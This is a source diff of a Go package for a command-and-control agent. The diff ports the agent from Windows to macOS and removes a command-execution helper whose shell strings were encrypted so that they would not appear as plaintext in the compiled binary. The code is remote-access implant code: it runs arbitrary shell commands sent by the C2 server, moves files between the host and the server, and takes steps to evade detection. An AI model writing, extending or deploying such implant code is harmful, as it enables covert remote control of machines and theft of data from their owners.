@@ -1,37 +1,26 @@
-//go:build windows
+//go:build windows || darwin
 
-// Package agent implements the remote-control capabilities of the Windows
-// agent: command execution, file upload (agent → C2), and file download
-// (C2 → agent).
+// Package agent implements the remote-control capabilities of the agent:
+// command execution, file upload (agent → C2), and file download (C2 → agent).
 //
 // All functions are designed to be called from goroutines spawned by the
 // tunnel.ClientTunnel callbacks and communicate results back to the C2 server
 // through the tunnel send queue.
+//
+// OS-specific shell invocation (cmd.exe on Windows, /bin/sh on macOS) lives in
+// shell_windows.go and shell_darwin.go respectively.
 package agent
 
 import (
-	"bytes"
 	"fmt"
 	"io"
 	"log"
 	"os"
-	"os/exec"
 	"sync"
 
-	"ipvicious/internal/crypto"
 	"ipvicious/internal/protocol"
 	"ipvicious/internal/tunnel"
 )
-
-// Pre-encrypted string literals – avoids plaintext in the binary.
-// Generated with: go run ./tools/strenc "<value>"
-// Key: {0xA7,0x3F,0x1E,0x92,0xC4,0x5D,0x8B,0x2A,0x6F,0xE3,0x47,0xB8,0xD1,0x09,0x7C,0x5E}
-
-// "cmd.exe"
-var _eCmdExe = []byte{0xC4, 0x52, 0x7A, 0xBC, 0xA1, 0x25, 0xEE}
-
-// "/C"
-var _eFlagC = []byte{0x88, 0x7C}
 
 // Agent wraps a ClientTunnel and exposes remote-control handlers.
 // The tunnel's OnCmd / OnFileGet / OnFilePut / OnStreamOpen callbacks are
@@ -64,8 +53,10 @@ func New(tun *tunnel.ClientTunnel) *Agent {
 
 // ─── command execution ────────────────────────────────────────────────────────
 
-// handleCmd executes cmd via cmd.exe /C, captures combined stdout/stderr, and
-// returns the output to the C2 server as TypeCmdOut frames followed by TypeAck.
+// handleCmd executes cmd via the platform shell (cmd.exe /C on Windows,
+// /bin/sh -c on macOS), captures combined stdout/stderr, and returns the
+// output to the C2 server as TypeCmdOut frames followed by TypeAck.
+// runCommand is provided by shell_windows.go or shell_darwin.go.
 func (a *Agent) handleCmd(streamID uint32, seqNo uint32, cmd string) {
 	output, execErr := runCommand(cmd)
 	if execErr != nil {
@@ -87,19 +78,6 @@ func (a *Agent) handleCmd(streamID uint32, seqNo uint32, cmd string) {
 	}
 	// End-of-output marker.
 	a.enqueue(protocol.TypeAck, streamID, seq+1, nil)
-}
-
-// runCommand runs cmd via cmd.exe /C and returns combined output.
-func runCommand(cmd string) ([]byte, error) {
-	shell := crypto.Dec(_eCmdExe) // "cmd.exe"
-	flag := crypto.Dec(_eFlagC)   // "/C"
-
-	c := exec.Command(shell, flag, cmd)
-	var buf bytes.Buffer
-	c.Stdout = &buf
-	c.Stderr = &buf
-	err := c.Run()
-	return buf.Bytes(), err
 }
 
 // ─── file upload (agent → C2) ─────────────────────────────────────────────────
